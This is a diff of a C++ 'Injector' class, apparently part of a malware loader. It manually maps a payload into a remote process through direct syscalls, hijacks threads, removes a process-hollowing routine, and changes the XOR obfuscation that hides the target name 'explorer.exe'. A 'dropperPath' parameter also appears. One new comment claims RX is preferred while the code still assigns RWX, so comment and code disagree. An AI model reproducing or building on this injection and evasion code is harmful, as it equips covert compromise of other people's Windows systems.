@@ -29,7 +29,7 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
     PVOID pTargetBase = NULL;
     SIZE_T imageSize = pNtHeaders->OptionalHeader.SizeOfImage;
 
-    // 1. Allocate memory in target process
+    // 1. Allocate memory in target process (Initial RW for mapping)
     NTSTATUS status = SysNtAllocateVirtualMemory(hProcess, &pTargetBase, 0, &imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!NT_SUCCESS(status)) return false;
 
@@ -133,7 +133,7 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
         return false;
     }
 
-    // 6. Set section protections
+    // 6. Set section protections (Avoid RWX where possible)
     PIMAGE_SECTION_HEADER pSect = IMAGE_FIRST_SECTION(pNtHeaders);
     for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
         PVOID pSectionAddr = (PVOID)((PBYTE)pTargetBase + pSect[i].VirtualAddress);
@@ -142,7 +142,12 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
 
         DWORD flProtect = 0;
         if (pSect[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
-            if (pSect[i].Characteristics & IMAGE_SCN_MEM_WRITE) flProtect = PAGE_EXECUTE_READWRITE;
+            if (pSect[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
+                // Some code sections might need RWX if they self-modify or for specific hooks
+                // but we prefer RX if possible. For manual mapping, we'll stick to RX unless
+                // characteristics explicitly demand WRITE.
+                flProtect = PAGE_EXECUTE_READWRITE;
+            }
             else if (pSect[i].Characteristics & IMAGE_SCN_MEM_READ) flProtect = PAGE_EXECUTE_READ;
             else flProtect = PAGE_EXECUTE;
         } else {
@@ -185,29 +190,6 @@ bool Injector::HijackThread(HANDLE hThread, PVOID pEntryPoint) {
     return true;
 }
 
-bool Injector::HollowProcess(const std::wstring& targetPath, const std::vector<uint8_t>& payload) {
-    STARTUPINFOW si; PROCESS_INFORMATION pi;
-    RtlZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
-    if (!CreateProcessW(NULL, (LPWSTR)targetPath.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-        return false;
-    }
-
-    PVOID pRemoteBase = NULL;
-    if (!MapAndInject(pi.hProcess, payload, &pRemoteBase)) {
-        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return false;
-    }
-
-    PBYTE pSrcData = (PBYTE)payload.data();
-    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrcData;
-    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);
-    PVOID pEntryPoint = (PVOID)((PBYTE)pRemoteBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
-
-    bool success = HijackThread(pi.hThread, pEntryPoint);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-    return success;
-}
-
 DWORD Injector::GetProcessIdByName(const std::wstring& processName) {
     DWORD pid = 0;
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -230,7 +212,7 @@ DWORD Injector::GetProcessIdByName(const std::wstring& processName) {
 
 bool Injector::InjectIntoExplorer(const std::vector<uint8_t>& payload, const std::wstring& dropperPath) {
     (void)dropperPath;
-    const wchar_t kExplorerEnc[] = { 'e'^0x5A, 'x'^0x5A, 'p'^0x5A, 'l'^0x5A, 'o'^0x5A, 'r'^0x5A, 'e'^0x5A, 'r'^0x5A, '.'^0x5A, 'e'^0x5A, 'x'^0x5A, 'e'^0x5A }; // explorer.exe
+    const wchar_t kExplorerEnc[] = { 'e'^0x4B, 'x'^0x1F, 'p'^0x8C, 'l'^0x3E, 'o'^0x4B, 'r'^0x1F, 'e'^0x8C, 'r'^0x3E, '.'^0x4B, 'e'^0x1F, 'x'^0x8C, 'e'^0x3E }; // explorer.exe
     std::wstring explorer = utils::DecryptW(kExplorerEnc, 12);
     DWORD pid = GetProcessIdByName(explorer);
     if (pid == 0) return false;
